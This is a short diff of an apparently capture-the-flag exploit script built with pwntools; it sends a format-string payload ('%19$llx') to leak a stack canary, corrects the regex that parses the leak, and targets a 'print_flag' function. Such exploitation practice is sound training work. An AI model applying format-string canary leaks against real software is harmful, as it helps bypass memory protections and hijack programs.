@@ -12,7 +12,7 @@ r.sendline(b"%19$llx") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
 # log.info(val)
-canary = int(re.match(b"Hello, (([0-9a-fA-F]+)\n!.*", val).groups()[0])
+canary = int(re.match(b"Hello, ([0-9a-fA-F]+)\n!.*", val).groups()[0])
 log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
